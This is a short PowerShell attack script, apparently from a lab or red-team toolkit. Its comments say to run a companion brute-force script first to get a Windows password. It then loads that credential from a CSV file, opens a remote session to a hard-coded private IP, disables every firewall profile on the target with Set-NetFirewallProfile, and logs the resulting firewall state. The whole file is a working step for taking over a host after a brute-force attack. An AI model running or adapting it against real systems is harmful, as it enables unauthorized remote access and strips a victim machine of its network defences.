# Run bruteforceWindowsOS.ps1 first to get the password, then run this script to run arbitrary Powershell commands
# You can change the variables below as required
# This is the same as baseScript.ps1, but it runs the command as an elevated user

# Import a CSV file with credentials
$credential = Import-Csv -Path "Powershell\credentials.csv" | Select-Object -First 1

# Define IP address
#$ip = "172.16.2.223"
$ip = "172.16.2.77"

# Define inner command to run
$cmdstring = "Set-NetFirewallProfile -All -Enabled False"
$cmdstring2 = "Get-NetFirewallProfile -All"

# Define filename + filepath to save to
$out = "Powershell\test.txt"

# Convert inner command to scriptblock format
$sb = [scriptblock]::Create($cmdstring)
$sb2 = [scriptblock]::Create($cmdstring2)

# Oneliner to read username, password from file, then start a new PSSession
$remoteSession = New-PSSession -ComputerName $ip -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList $credential.Username, (ConvertTo-SecureString $credential.Password -AsPlainText -Force))
Write-Host "Connected"
# Invokes the command on the remote machine
Write-Host "Running $cmdstring"
Invoke-Command -Session $remoteSession -ScriptBlock $sb
Write-Host "Running $cmdstring2"
Invoke-Command -Session $remoteSession -ScriptBlock $sb2 | Out-File -FilePath $out
# Closes the PSSession
Exit-PSSession
Write-Host "Done"
